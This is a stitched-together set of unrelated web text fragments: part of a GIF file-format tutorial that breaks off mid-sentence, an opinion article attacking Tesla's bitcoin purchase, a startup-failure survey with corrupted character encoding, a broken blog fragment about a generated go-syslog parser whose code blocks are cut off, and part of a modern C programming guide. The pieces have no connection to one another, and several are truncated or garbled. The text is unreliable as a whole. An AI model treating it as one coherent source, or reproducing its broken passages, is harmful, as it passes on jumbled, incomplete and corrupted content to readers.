	The next byte gives us the <strong>background color index</strong>. This byte is only meaningful
	if the global color table flag is 1. It represents which color in the global color table
	(by specifying its index) should be used for pixels whose value is not specified in the
	image data. If, by some chance, there is no global color table, this byte should be 0.
	</p>
	<p>
	The last byte of the logical screen descriptor is the <strong>pixel aspect ratio</strong>.
	I'm not exactly sure what this value does. Most of the images I've seen have this value
	set to 0. The spec says that if there was a value specified in this byte, N, the actual
	ratio used would be (N + 15) / 64 for all N&lt;&gt;0.
	</p>
	<p><img src="http://matthewflickinger.com/lab/whatsinagif/images/logical_screen_desc_block.gif" alt="GIF logical screen descriptor block layout"></p>





	<h2><a name="global_color_table_block">Global Color Table</a></h2>
	<p>From Sample File: <span> FF </span><span> FF </span><span> FF </span><span> FF </span><span> 00 </span><span> 00 </span><span> 00 </span><span> 00 </span><span> FF </span><span> 00 </span><span> 00 </span><span> 00 </span></p>
	<p>
	We've mentioned the <strong>global color table</strong> a few times already now lets talk
	about what it actually is. As you are probably already aware, each GIF has its own color
	palette. That is, it has a list of all the colors that can be in the image and cannot
	contain colors that are not in that list. The global color table is where that list
	of colors is stored. Each color is stored in three bytes. Each of the bytes represents
	an RGB color value. The first byte is the value for red (0-255), next green, then blue.
	The size of the global color table is determined by the value in the packed byte of the
	logical screen descriptor. As we mentioned before, if the value from that byte is N, then
	the actual number of colors stored is 2^(N+1). This means that the global color table will
	take up 3*2^(N+1) bytes in the stream.
	</p>

	<div>
	<table id="global_color_size">
	<tbody><tr><th>Size In Logical<br>Screen Desc</th><th>Number Of<br>Colors</th><th>Byte<br>Length</th></tr>
	<tr><td>0</td><td>2</td><td>6</td></tr>
	<tr><td>1</td><td>4</td><td>12</td></tr>
	<tr><td>2</td><td>8</td><td>24</td></tr>
	<tr><td>3</td><td>16</td><td>48</td></tr>
	<tr><td>4</td><td>32</td><td>96</td></tr>
	<tr><td>5</td><td>64</td><td>192</td></tr>
	<tr><td>6</td><td>128</td><td>384</td></tr>
	<tr><td>7</td><td>256</td><td>768</td></tr>
	</tbody></table>
	</div>

	<p>
	Or sample file has a global color table size of 1. This means it holds 2^(1+1)=2^2=4 colors.
	We can see that it takes up 12, (3*4), bytes as expected. We read the bytes three at a time to get
	each of the colors. The first color is #FFFFFF (white). This value is given an index of 0.
	The second color is #FF0000 (red). The color with an index value of 2 is #0000FF (blue).
	The last color is #000000 (black). The index numbers will be important when we decode
	the actual image data.
	</p>
	<p>
	Note that this block is labeled as "optional." Not every GIF has to specify a global
	color table. However, if the global color table flag is set to 1 in the logical
	screen descriptor block, the color table is then required to immediately follow that
	block.
	</p>
	<p><img src="http://matthewflickinger.com/lab/whatsinagif/images/global_color_table.gif" alt="GIF global color table block layout"></p>



	<h2><a name="graphics_control_extension_block">Graphics Control Extension</a></h2>
	<p>From Sample File: <span> 21 </span><span> F9 </span><span> 04 </span><span> 00 </span><span> 00 </span><span> 00 </span><span> 00 </span><span> 00 </span></p>
	<p>
	Graphic control extension blocks are used frequently to
	specify transparency settings and control animations. They are completely optional.
	Since transparency and animations are bit complicated, I will hold off on many of
	the details of this block until a later section
	(see <a href="http://matthewflickinger.com/lab/whatsinagif/animation_and_transparency.asp">Transparency and Animation</a>).
	In the interest of this page being complete, I will at least tell you what
	the bytes represent.
	</p>
	<p>
	The first byte is the <strong>extension introducer</strong>. All <em>extension</em>
	blocks begin with <span>21</span>. Next is the <strong>graphic
	control label</strong>, <span>F9</span>, which is the value that
	says this is a graphic control extension. Third up is the total <strong>block
	size</strong> in bytes. Next is a packed field. Bits 1-3 are reserved for future
	use. Bits 4-6 indicate <strong>disposal method</strong>. The penult bit is
	the <strong>user input flag</strong> and the last is the <strong>transparent color
	flag</strong>. The <strong>delay time</strong> value follows in the next two bytes
	stored in the unsigned format. After that we have the <strong>transparent color
	index</strong> byte. Finally we have the <strong>block terminator</strong> which
	is always <span>00</span>.
	</p>
	<p><img src="http://matthewflickinger.com/lab/whatsinagif/images/graphic_control_ext.gif" alt="GIF graphic control extension block layout"></p>




	<h2><a name="image_descriptor_block">Image Descriptor</a></h2>
	<p>From Sample File: <span> 2C </span><span> 00 </span><span> 00 </span><span> 00 </span><span> 00 </span><span> 0A </span><span> 00 </span><span> 0A </span><span> 00 </span><span> 00 </span></p>
	<p>
	A single GIF file may contain multiple images (useful when creating animated
	images). Each image begins with an image descriptor block. This block is exactly
	10 bytes long.
	</p>
	<p>
	The first byte is the <strong>image separator</strong>. Every image
	descriptor begins with the value <span>2C</span>. The next 8 bytes
	represent the location and size of the following image. An image in
	the stream may not necessarily take up the entire canvas size defined by
	the logical screen descriptor. Therefore, the image descriptor specifies
	the <strong>image left position</strong> and <strong>image top position</strong> of
	where the image should begin on the canvas. Next it specifies the
	<strong>image width</strong> and <strong>image height</strong>. Each of these
	values is in the two-byte, unsigned format. Our sample image indicates that
	the image starts at (0,0) and is 10 pixels wide by 10 pixels tall. (This image
	does take up the whole canvas size.)
	</p>
	<p>
	The last byte is another packed field. In our sample file this byte is 0 so
	all of the sub-values will be zero. The first (most significant) bit in
	the byte is the <strong>local color table flag</strong>. Setting this flag
	to 1 allows you to specify that the image data that follows uses a different
	color table than the global color table. (More information on the local
	color table follows.) The second bit is the <strong>interlace flag</strong>.

	The local color table looks identical to the global color table. The local
	color table would always immediately follow an image descriptor but will only
	be there if the local color table flag is set to 1. It is effective only for the

<p>Tesla bought $1.5 billion worth of bitcoin, the company said in a <a rel="noreferrer noopener" href="https://secfilings.nasdaq.com/filingFrameset.asp?FilingID=14678414&amp;RcvdDate=2/8/2021&amp;CoName=TESLA,%20INC.&amp;FormType=10-K&amp;View=html" target="_blank">regulatory filing</a> on Monday, effectively putting nearly all of the money it earned on clean car credits towards the world’s filthiest asset. </p>



<p>Where to begin? Let’s start with the firm’s SEC filing. As of January 2021, the Silicon Valley-based company updated its investment policy to allow it more flexibility in diversifying its returns on cash. Those changes allow Tesla to buy bitcoin and other cryptocurrencies, which it immediately did.</p>



<p>“Thereafter, we invested an aggregate $1.50 billion in bitcoin under this policy and may acquire and hold digital assets from time to time or long-term. Moreover, we expect to begin accepting bitcoin as a form of payment for our products in the near future, subject to applicable laws and initially on a limited basis, which we may or may not liquidate upon receipt.”</p>



<p>The filing does not say how Tesla bought the bitcoin or how they are custodying it. It also does not tell us how many bitcoin it purchased or for what average price. We only know Tesla bought bitcoin sometime between Jan. 1 and early February, when the price was between $30,000 to $41,000.&nbsp;</p>



<p>Tesla says its customers will be able to buy its vehicles with bitcoin. However, “liquidate upon receipt” means that if you purchase a Tesla with bitcoins, the company is likely to sell those bitcoins for cash immediately, something that is usually done by sending the funds through a payment processor first. </p>



<p>This is what most large merchants do when they say they are accepting bitcoin. They convert it to cash, so they don’t have to deal with bitcoin’s wild volatility. So if you buy a Tesla with bitcoin in the future, it will likely be the same as selling your bitcoin for fiat and then handing the cash over to Tesla. </p>



<h2>Clean car credits for bitcoin</h2>



<p>Tesla earns tradable credits under various regulations related to zero-emission vehicles, greenhouse gas, fuel economy, renewable energy, and clean fuel. It then turns around and sells those credits to other automakers when they can’t comply with auto emissions and fuel economy standards.</p>



<p>In 2020, Tesla reported making $1.58 billion in selling these tradable credits it received. And here is the important bit: without those tradeable credits, the company would not have been profitable. <a href="https://apnews.com/article/coronavirus-pandemic-67705113fb4f895bd051a1bee1d23518" target="_blank" rel="noreferrer noopener">Tesla would have lost money.</a> So what does it do with that money? It turns around and buys bitcoin. </p>



<p>Bitcoin is an environmental disaster. The bitcoin network currently burns around 116.87 terawatt-hours per year, according to the <a href="https://cbeci.org/">University of Cambridge’s Centre for Alternative Finance.</a> To give you an idea of how devastating that is to our climate, that is as much energy as a small country or <a href="https://news.bitcoin.com/the-bitcoin-network-now-consumes-7-nuclear-plants-worth-of-power/#:~:text=The%20Cambridge%20Bitcoin%20Electricity%20Consumption%20Index%20(CBECI)%20shows%20the%20estimated,is%207.46%20gigawatts%20(GW).&amp;text=The%20amount%20of%20power%20consumed,photovoltaic%20(PV)%20solar%20panels." target="_blank" rel="noreferrer noopener">seven nuclear power plants. </a></p>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">Bitcoin is such an environmental disaster it really is a crime against humanity.  So what does Tesla do with their $1.5B in revenue last year from clean car credits sold to other automakers?  Put it into “Destroy the Planet Inc”</p>— Nicholas Weaver (@ncweaver) <a href="https://twitter.com/ncweaver/status/1358780808144723968?ref_src=twsrc%5Etfw">February 8, 2021</a></blockquote></div>
</div></figure>



<p>Keep in mind, bitcoin’s energy consumption increases right alongside the price of bitcoin. As bitcoin goes up in price, more people want to mine the virtual currency for profit, leading to greater energy consumption as they pile more money into power-hungry ASIC rigs.</p>



<p>Bitcoin is not only filthy for its energy waste but also because it is the currency of choice in underground economies. <a href="https://www.forbes.com/sites/andreatinianow/2020/07/01/bitcoin-demand-drives-14-billion-ransomware-industry-in-the-us/?sh=40346fca32d8" target="_blank" rel="noreferrer noopener">Ransomware</a> would probably not exist if it were not for bitcoin. </p>



<p>And bitcoin fits the very definition of <a rel="noreferrer noopener" href="https://www.ic.unicamp.br/~stolfi/bitcoin/2020-12-31-bitcoin-ponzi.html" target="_blank">a Ponzi scheme.</a> It has no intrinsic value—any money new investors put into the system immediately goes out via bitcoin miners selling their 900 newly minted bitcoin per day. Tesla’s massive influx of cash will fund the bitcoin miners for about a month and a half, at most. </p>



<h2>Elon Musk shilling crypto</h2>



<p>Two years ago, Musk and Tesla paid a combined <a rel="noreferrer noopener" href="https://www.sec.gov/news/press-release/2018-226" target="_blank">$40 million penalty</a> to the SEC after Musk’s cryptic tweets about taking Tesla private led to stock fluctuations. The regulator <a href="https://www.sec.gov/litigation/complaints/2018/comp-pr2018-219.pdf">charged him</a> with securities fraud. As part of the settlement, Musk agreed to step down as chairman of the company, although he continued to hold the title of CEO. </p>



<p>Apparently, Musk has learned nothing from that experience. Last month, presumably around the time Tesla was buying up hoards of bitcoin unbeknownst to the general public, Musk caused the price of bitcoin to go up 20% when he <a rel="noreferrer noopener" href="https://www.cnbc.com/2021/01/29/bitcoin-spikes-20percent-after-elon-musk-adds-bitcoin-to-his-twitter-bio.html" target="_blank">changed his&nbsp;Twitter bio</a>&nbsp;to include the word “bitcoin.”</p>



<p>Soon after changing the bio, Musk said in a&nbsp;<a rel="noreferrer noopener" href="https://twitter.com/elonmusk/status/1355068728128516101" target="_blank">tweet:</a> “In retrospect, it was inevitable.” In retrospect, that tweet looks like an early hint that Tesla was funneling money into the digital asset.  </p>



<figure><div>

</div></figure>



<p>Will Musk get into trouble for his bitcoin tweets? </p>



<p>It is unlikely, Columbia University Law Professor John Coffee, Jr., told the <a href="https://www.wsj.com/articles/tesla-buys-1-5-billion-in-bitcoin-11612791688">Wall Street Journal</a>, especially given that a federal judge rebuked the SEC when it sought to hold Musk in contempt in 2019. “I don’t think the commission would dare push it that far,” he said. </p>



<p>The latest Tesla news caused bitcoin to spike 18% this morning, <a rel="noreferrer noopener" href="https://www.cnbc.com/2021/02/08/bitcoin-surges-above-43000-to-a-record-after-elon-musks-tesla-buys-1point5-billion.html" target="_blank">sending the price to over $44,000,</a> and setting a new all-time high. </p>



<p><em>Updates Feb. 8: Bitcoin topped $44,000 on Monday, even higher than the $43,000 I mentioned earlier. I added that in the SEC settlement Musk agreed to step down as chairman of Tesla. And I added the Coffee quote from WSJ.</em></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure><img alt="visualizing startup failure" src="https://storage.googleapis.com/wl-blog/images/startup-fail-01.png"></figure><div><p dir="ltr">Why do startups fail, and what can founders do to prevent it?</p>
<p dir="ltr">Many entrepreneurs and investors opine on this question, but few offer data-driven answers. Our goal is to identify and share clear learnings on this, and the timing could not be more critical.</p>
<p dir="ltr">In 2020, the U.S. Internal Revenue Service received more than 4.4 million applications for new businesses according to the Bureau of Labor Statistics (BLS).<sup>1</sup> In the second, third, and fourth quarters, business formation topped <em>every quarter since 2005</em>. Although COVID-19 has shuttered almost 30% of small businesses, it is simultaneously responsible for the 21st centuryâ€™s greatest surge in entrepreneurship.<sup>2</sup></p>
<p>For would-be founders, thereâ€™s no avoiding the undeniable: sustained success is statistically unlikely. Nearly a fifth of new businesses shut down in their first year according to BLS data.<sup>3</sup> Even with venture backing, a staggering three-quarters of startups fail according to research by Shikhar Ghosh of Harvard Business School.<sup>4 </sup>However, fear of failure shouldnâ€™t prevent anyone from starting a business.</p>
<p dir="ltr">One great way to raise the odds of startup success is to learn from current and past entrepreneurs. Towards that end, Wilbur Labs surveyed more than 150 startup founders about the pressures that threatened their businesses. We also pulled records of 350 startup failures from CB Insights and Autopsy then analyzed them for patterns. The resulting insights can help founders improve their odds of success this year and beyond.</p>
<p dir="ltr">When founders solve significant problems and avoid preventable failures, everyone stands to benefit. In that spirit, weâ€™ll examine why startups fail (i.e., shutdown permanently) and how they overcome potential failures.</p></div><h2>Why Startups Fail</h2><p>About 70% of entrepreneurs will face potential business failure based on our survey of more than 150 founders. Nearly 66% will face this potential failure within 25 months of launching their company. Almost 77% of respondents who faced potential failure said it was due â€” at least in part â€” to COVID-19.</p><figure><img alt="statistic of founders facing business failure" src="https://storage.googleapis.com/wl-blog/images/startup-fail-02.png"></figure><p>Based on a novel analysis of data from CB Insights and Autopsy, we identified the reasons that founders cite for failure.<sup>5,6</sup> Keep in mind: this is self-reported data.</p><figure><img alt="most common reasons for startup failure" src="https://storage.googleapis.com/wl-blog/images/startup-fail-03.png"></figure><div><p dir="ltr">More than one-third of founders believe that running out of money led to failure. Second to that, founders attribute their failure to a lack of financing or investor interest. In other words, if they managed to generate more revenue, spend less money, and/or raise capital through alternative channels, their startups might have survived.</p>
<p dir="ltr">Running out of money seems related to the third most common reason for failure: no business plan or model. Perhaps founders mistakenly believe that a business plan will slow them down or limit their agility. Or, maybe they expect to exit before thereâ€™s pressure to be profitable. Such founders are likely to bank on their next funding round, an acquisition, or a major enterprise deal for survival. If those donâ€™t materialize, thereâ€™s no plan B.</p>
<p dir="ltr">Although most startups cannot expect to generate profits immediately, they should have a break-even point and a plan to reach it. As former Google CEO Eric Schmidt often says, â€œRevenue solves all known problems.â€� Revenue can also solve <em>unknown</em> problems, as the COVID-19 pandemic has illustrated.</p>
<p dir="ltr">Revenue generation also proves that a startup is solving a significant problem in a sustainable way. If no one will pay for the solution, more financing wonâ€™t necessarily change that. There is simply no better measure of product-market fit and competitiveness than revenue.</p>
<p dir="ltr">Based on the data, strong business planning with an eye towards profitability is the surest way to avoid failure. When Wilbur Labs surveyed 150+ founders about their recommendations for preventing failure, they tended to agree:</p></div><figure><img alt="founder recommendations for preventing startup failure" src="https://storage.googleapis.com/wl-blog/images/startup-fail-04.png"></figure><div><p dir="ltr">Nearly 30% of respondents urged founders to do more research prior to launch, while roughly 22% recommended building a stronger business plan. Even though running out of money is the leading cause of failure, relatively few (13.5%) founders recommend financing as a way to prevent that.</p>
<p dir="ltr">In a free-response section where respondents could enter any advice for founders, this theme persisted. A quarter of responses emphasized research, planning, and/or preparation. Only 6% said â€œjust do itâ€� or â€œgo for it.â€�</p>
<p dir="ltr">We encourage founders to look at Wilbur Labsâ€™ Concept Evaluation â€” our version of a business plan â€” which you can view in our post, <a href="https://www.wilburlabs.com/blueprints/how-to-turn-an-idea-into-a-business">How to Turn an Idea Into a Business</a>.</p></div><h2>Reasons for Startup Failure Over Time</h2><p>Launching a business is never easy. But do the dominant causes of failure change over time? To find out, we plotted the prevalence of each reason for failure across the last six years.</p><figure><img alt="reasons for startup failure" src="https://storage.googleapis.com/wl-blog/images/startup-fail-05.png"></figure><div><p dir="ltr">Although the causes of startup failure changed significantly in a mere six years, challenges with money and financing remained the top reasons for failure. In fact, they have grown more troublesome since 2014, even as venture investment totals break new records annually.</p>
<p dir="ltr">Venture money is not distributed evenly, however. The National Venture Capital Association (NVCA) and PitchBook note that â€œmega dealsâ€� (venture investments of $100M or more) account for a growing proportion of the total â€” about 45% in 2020, up from 40% in 2019.<sup>7,8 </sup>Unless VCs are lined up to invest, depending on the next venture round is an ever-riskier survival strategy for startups.</p>
<p dir="ltr">Some causes of failure have grown more prevalent since 2014, including a lack of market need. That doesnâ€™t mean the world is running out of startup ideas (see <a href="https://www.wilburlabs.com/blueprints/how-to-get-startup-ideas">How to Get Startup Ideas</a>, a Wilbur Labs post addressing this topic in detail). Rather, that may reflect a lack of cultural, geographic, and socioeconomic diversity among founders and investors. The sense of increasing competition may suggest that too many founders have piled into red oceans without enough differentiation. Notice that a lack of market need and mistimed products spiked <em>only</em> in 2020. COVID-19 throttled startups that could not adapt to socially distanced living.</p>
<p dir="ltr">Either way, long gone are the days when founders could launch an app or product and users would swarm to try it. Thereâ€™s too much noise out there. Solving real problems that serve people better is even more critical now, given the sheer number of products competing daily for attention.</p>
<p dir="ltr">Legal challenges have also been on the rise, perhaps due to increasing regulation of digital companies. Before Europeâ€™s General Data Protection Regulation (GDPR) went into effect in 2018, UK small businesses each spent an average of 600 hours to prepare.<sup>9</sup> Early on in a venture, any distraction from building a product and serving customers can be deadly. Encouragingly, fewer founders say their network, scale, team, UX, marketing, or lack of focus are barriers to success compared to six years ago. Maybe startup development is becoming more professional and systematic. Failure to pivot is another barrier in decline. Nearly 30% of startups reported this being a cause for their failure in 2014, but six years later, just under 15% reported the same. Founders willing to pivot tend to raise their odds of success, as the next set of data demonstrates.</p></div><h2>Startup Founders and Pivot Strategies</h2><p>In our survey of 150 founders, 55% reported pivoting to avoid failure. Less than half felt confident in their likelihood of success when the pivot took place. Even so, nearly 75% of the founders who pivoted said it was successful.</p><figure><img alt="percentage of founders who pivoted" src="https://storage.googleapis.com/wl-blog/images/startup-fail-06.png"></figure><figure><img alt="founders who pivoted and succeeded percentage" src="https://storage.googleapis.com/wl-blog/images/startup-fail-07.png"></figure><div><p dir="ltr">During a pivot, founders should build the plane as they fly it. The team must learn from mistakes, iterate, and adapt quickly â€” before the money runs out. Presumably, founders who invest in identifying and mitigating future risks have better odds of not only pivoting but surviving the process.</p>
<p dir="ltr">But which pivots work and why? Which strategies save companies?</p></div><figure><img alt="most common pivot strategies" src="https://storage.googleapis.com/wl-blog/images/startup-fail-08.png"></figure><div><p dir="ltr">A majority of founders pivoted by updating or improving their business plan. As noted earlier, a bad business plan is the third most common cause of failure and is linked to running out of money, the most frequently reported reason for failure.</p>
<p dir="ltr">Few startups launch with a bulletproof, immutable plan. Rather, successful founders create a plan and improve it continuously as market conditions and customer feedback demand. Changing the business plan can lead to the second and third most popular strategies: improving the existing product or launching a new one.</p>
<p dir="ltr">Almost 13% of founders said they attempted to pivot by securing additional funding or investors. This is a rarer pivot but an important one given how commonly startups fail by running out of money or by failing to secure more funding. While capital-intensive businesses (e.g., clean industrial technologies) may depend on external financing for longer than average, most startups can avoid this dicey pivot by focusing on their business model and revenue. </p></div><h2>Advice From Other Founders</h2><p>The odds are stacked against startups. But by studying other foundersâ€™ mistakes, aspiring entrepreneurs can anticipate and manage preventable failures. With this in mind, Wilbur Labs asked startup founders to indicate the advice they would give to other entrepreneurs.</p><figure><img alt="advice for aspiring startup founders" src="https://storage.googleapis.com/wl-blog/images/startup-fail-09.png"></figure><div><p dir="ltr">The leading suggestions are fundamental rules of startup survival: learn from mistakes, listen to customers, and ensure that there is a market for your product.</p>
<div dir="ltr"><p>Less common but noteworthy is how many founders recommend looking for outside help in the form of legal advice (29%), networking (28%), consultants (28%), and a team with diversified skills (22%). </p><p>Despite the stereotype, successful founders are <em>not</em> rugged individualists living off Walden Pond. They surround themselves with experts and mentors who have encountered and solved the challenges endemic to building any startup. Founders who learn from these advisors can focus on their own vision rather than on reinventing the wheel.</p></div></div><h2>Supporting Startup Success</h2><p>Although failure is disappointing, two-thirds of the founders who faced potential failure would be willing to launch another venture.</p><figure><img alt="founder willingness to start another company" src="https://storage.googleapis.com/wl-blog/images/startup-fail-10.png"></figure><div><p dir="ltr">Having examined …</p></div></div></div>

<a href="https://github.com/influxdata/go-syslog/blob/develop/rfc3164/machine.go">https://github.com/influxdata/go-syslog/blob/develop/rfc3164/machine.go</a> were:
“What a heck is that?”, “Who is writing in Golang but in C-like style?” and
“How can I read it and make any modifications here?”</p><p>Before making any modifications I have to get a bit understanding how it works.
Everything is completely clear until
<a href="https://github.com/influxdata/go-syslog/blob/develop/rfc3164/machine.go#L97">line:97</a>
where two things start: function <code>machine.Parse</code> and “goto hell”. The function
is <em>8500</em> lines long and mostly consists of labels, <code>goto</code> statements and “magic
numbers”. At that point I had no idea how to deal with it.</p><p>That is how it looks like</p><div><pre><code data-lang="go">	{

started project exploring. I quickly found another file

be filled during the parse process.</p><div><pre><code data-lang="go"><span>type</span> Phone <span>struct</span>{

significant part of the development. They validate generated code and produce
the result we expect. In most of my cases it is faster to write such tests
rather than trying to debug generated code manually. Also, small changes in the
generator input can drastically change and output.</p><p>We have an input, we know what we want to get as an output, we are good to
write tests. Due to our parser does two things, parses the phone itself,
validates phone format and returns an error if format is incorrect. We need
three groups of tests:</p><ul><li><strong>positive tests</strong>, i.e. tests which check all <em>correct</em> values parsed properly</li><li>tests which check <strong>correctness of area code</strong> and validates an error, and</li><li>tests which check <strong>correctness of phone number</strong> and validates an error</li></ul><p>For unit tests I use <a href="https://onsi.github.io/ginkgo/">Ginkgo</a> library.

<p><em><a href="https://twitter.com/NGalbreath">Nick Galbreath</a> collected some relevant links about <a href="http://www.client9.com/article/how-to-program-in-c/">overall C programming</a> as well.</em></p>
<p><em>Now on to the article…</em></p>
<p>The first rule of C is don’t write C if you can avoid it.</p>
<p>If you must write in C, you should follow modern rules.</p>
<p>C has been around since the <a href="https://www.bell-labs.com/usr/dmr/www/chist.html">early 1970s</a>. People have “learned C” at various points during its evolution, but knowledge usually get stuck after learning, so everybody has a different set of things they believe about C based on the year(s) they first started learning.</p>
<p>It’s important to not remain stuck in your “things I learned in the 80s/90s” mindset of C development.</p>
<p>This page assumes you are on a modern platform conforming to modern standards and you have no excessive legacy compatibility requirements. We shouldn’t be globally tied to ancient standards just because some companies refuse to upgrade 20 year old systems.</p>
<h2 id="_preflight">Preflight</h2>
<p>Standard c99 (c99 means “C Standard from 1999”; c11 means “C Standard from 2011”, so 11 &gt; 99).</p>
<ul>
<li>clang, default
<ul>
<li>clang uses an extended version of C11 by default (<code>GNU C11 mode</code>), so no extra options are needed for modern features.</li>
<li>If you want standard C11, you need to specify <code>-std=c11</code>; if you want standard C99, use <code>-std=c99</code>.</li>
<li>clang compiles your source files faster than gcc</li>
</ul></li>
<li>gcc requires you specify <code>-std=c99</code> or <code>-std=c11</code>
<ul>
<li>gcc builds source files slower than clang, but <em>sometimes</em> generates faster code. Performance comparisons and regression testings are important.</li>
<li>gcc-5 defaults to <code>GNU C11 mode</code> (same as clang), but if you need exactly c11 or c99, you should still specify <code>-std=c11</code> or <code>-std=c99</code>.</li>
</ul></li>
</ul>
<p>Optimizations</p>
<ul>
<li>-O2, -O3
<ul>
<li>generally you want <code>-O2</code>, but sometimes you want <code>-O3</code>. Test under both levels (and across compilers) then keep the best performing binaries.</li>
</ul></li>
<li>-Os
<ul>
<li><code>-Os</code> helps if your concern is cache efficiency (which it should be)</li>
</ul></li>
</ul>
<p>Warnings</p>
<ul>
<li><code>-Wall -Wextra -pedantic</code>
<ul>
<li><a href="https://twitter.com/oliviergay/status/685389448142565376">newer compiler versions</a> have <code>-Wpedantic</code>, but they still accept the ancient <code>-pedantic</code> as well for wider backwards compatibility.</li>
</ul></li>
<li>during testing you should add <code>-Werror</code> and <code>-Wshadow</code> on all your platforms
<ul>
<li>it can be tricky deploying production source using <code>-Werror</code> because different platforms and compilers and libraries can emit different warnings. You probably don’t want to kill a user’s entire build just because their version of GCC on a platform you’ve never seen complains in new and wonderous ways.</li>
</ul></li>
<li>extra fancy options include <code>-Wstrict-overflow -fno-strict-aliasing</code>
<ul>
<li>Either specify <code>-fno-strict-aliasing</code> or be sure to only access objects as the type they have at creation. Since so much existing C code aliases across types, using <code>-fno-strict-aliasing</code> is a much safer bet if you don’t control the entire underlying source tree.</li>
</ul></li>
<li>as of now, Clang reports some valid syntax as a warning, so you should add <code>-Wno-missing-field-initializers</code>
<ul>
<li>GCC fixed this unnecessary warning after GCC 4.7.0</li>
</ul></li>
</ul>
<p>Building</p>
<ul>
<li>Compilation units
<ul>
<li>The most common way of building C projects is to decompose every source file into an object file then link all the objects together at the end. This procedure works great for incremental development, but it is suboptimal for performance and optimization. Your compiler can’t detect potential optimizations across file boundaries this way.<br>
</li>
</ul></li>
<li>LTO —&nbsp;Link Time Optimization
<ul>
<li>LTO fixes the “source analysis and optimization across compilation units problem” by annotating object files with intermediate representation so source-aware optimizations can be carried out across compilation units at link time.</li>
<li>LTO can slow down the linking process noticeably, but <code>make -j</code> helps if your build includes multiple non-interdependent final targets (.a, .so, .dylib, testing executables, application executables, etc).</li>
<li><a href="http://llvm.org/docs/LinkTimeOptimization.html">clang LTO</a> (<a href="http://llvm.org/docs/GoldPlugin.html">guide</a>)</li>
<li><a href="https://gcc.gnu.org/onlinedocs/gccint/LTO-Overview.html">gcc LTO</a></li>
<li>As of 2016, clang and gcc releases support LTO by just adding <code>-flto</code> to your command line options during object compilation and final library/program linking.</li>
<li><code>LTO</code> still needs some babysitting though. Sometimes, if your program has code not used directly but used by additional libraries, LTO can evict functions or code because it detects, globally when linking, some code is unused/unreachable and doesn’t <em>need</em> to be included in the final linked result.</li>
</ul></li>
</ul>
<p>Arch</p>
<ul>
<li><code>-march=native</code>
<ul>
<li>give the compiler permission to use your CPU’s full feature set</li>
<li>again, performance testing and regression testing is important (then comparing the results across multiple compilers and/or compiler versions) is important to make sure any enabled optimizations don’t have adverse side effects.</li>
</ul></li>
<li><code>-msse2</code> and <code>-msse4.2</code> may be useful if you need to target not-your-build-machine features.</li>
</ul>
<h2 id="_writing-code">Writing code</h2>
<h3 id="_types">Types</h3>
<p>If you find yourself typing <code>char</code> or <code>int</code> or <code>short</code> or <code>long</code> or <code>unsigned</code> into new code, you’re doing it wrong.</p>
<p>For modern programs, you should <code>#include &lt;stdint.h&gt;</code> then use <em>standard</em> types.</p>
<p>For more details, see the <a href="http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/stdint.h.html">stdint.h specification</a>.</p>
<p>The common standard types are:</p>
<ul>
<li><code>int8_t</code>, <code>int16_t</code>, <code>int32_t</code>, <code>int64_t</code> —&nbsp;signed integers</li>
<li><code>uint8_t</code>, <code>uint16_t</code>, <code>uint32_t</code>, <code>uint64_t</code> — unsigned integers</li>
<li><code>float</code> —&nbsp;standard 32-bit floating point</li>
<li><code>double</code> - standard 64-bit floating point</li>
</ul>
<p>Notice we don’t have <code>char</code> anymore. <code>char</code> is actually misnamed and misused in C.</p>
<p>Developers routinely abuse <code>char</code> to mean “byte” even when they are doing unsigned byte manipulations. It’s much cleaner to use <code>uint8_t</code> to mean single a unsigned-byte/octet-value and <code>uint8_t *</code> to mean sequence-of-unsigned-byte/octet-values.</p>
<h4 id="_special-standard-types">Special Standard Types</h4>
<p>In addition to standard fixed-width like <code>uint16_t</code> and <code>int32_t</code>, we also have <strong>fast</strong> and <strong>least</strong> types defined in the <a href="http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/stdint.h.html">stdint.h specification</a>.</p>
<p><strong>Fast</strong> types are:</p>
<ul>
<li><code>int_fast8_t</code>, <code>int_fast16_t</code>, <code>int_fast32_t</code>, <code>int_fast64_t</code> — signed integers</li>
<li><code>uint_fast8_t</code>, <code>uint_fast16_t</code>, <code>uint_fast32_t</code>, <code>uint_fast64_t</code> — unsigned integers</li>
</ul>
<p>Fast types provide a minimum of <code>X</code> bits, but there is no guarantee the underlying storage size is exactly what you request. If a larger type has better support on your target platform, a <em>fast</em> type will automatically use the better supported larger type.</p>
<p>The best example here is, on some 64-bit systems, when you request <code>uint_fast16_t</code> you actually get a <code>uint64_t</code> because operating on word-sized integers will be faster than operating on half of a 32-bit integer.</p>
<p>The <em>fast</em> guidelines aren’t followed on every system though. One standout is OS X, where <em>fast</em> types are <a href="https://opensource.apple.com/source/xnu/xnu-1456.1.26/EXTERNAL_HEADERS/stdint.h">defined exactly as their corresponding fixed width counterparts</a>.</p>
<p>Fast types can be useful for self-documenting code as well. If you know your counters only need 16 bits, but you prefer your math use 64 bit integers because they are faster on your platform, that’s where <code>uint_fast16_t</code> would help. Under 64-bit Linux platforms, <code>uint_fast16_t</code> gives you a fast 64-bit counter while maintaining the code-level inline documentation of “we only need 16 bits here.”</p>
<p>One thing to be aware of for fast types: it can impact certain test cases. If you need to test for storage width edge cases, having <code>uint_fast16_t</code> be 16 bits on some platforms (OS X) and 64 bits on other platforms (Linux) can increase the minimum number of platforms where your tests need to pass.</p>
<p><em>Fast</em> types do introduce the same uncertainty as <code>int</code> not being a standard size across platforms, but with <em>fast</em> types, you can limit your uncertainty to known-safe locations in your code (counters, temporary values with checked bounds, etc).</p>
<p><strong>Least</strong> types are:</p>
<ul>
<li><code>int_least8_t</code>, <code>int_least16_t</code>, <code>int_least32_t</code>, <code>int_least64_t</code> — signed integers</li>
<li><code>uint_least8_t</code>, <code>uint_least16_t</code>, <code>uint_least32_t</code>, <code>uint_least64_t</code> — unsigned integers</li>
</ul>
<p>Least types provide you with the most <em>compact</em> number of bits for the type you request.</p>
<p>The <em>least</em> guidelines, in practice, mean <em>least</em> types are just defined to standard fixed width types, since standard fixed width types already provide the exact minimum number of bits you request.</p>
<h4 id="_to-int-or-not-to-int">to <code>int</code> or not to <code>int</code></h4>
<p>Some readers have pointed out they truly love <code>int</code> and you’ll have to pry it from their cold dead fingers. I’d like to point out is is technically <em>impossible</em> to program correctly if the sizes of your types change out from under you.</p>
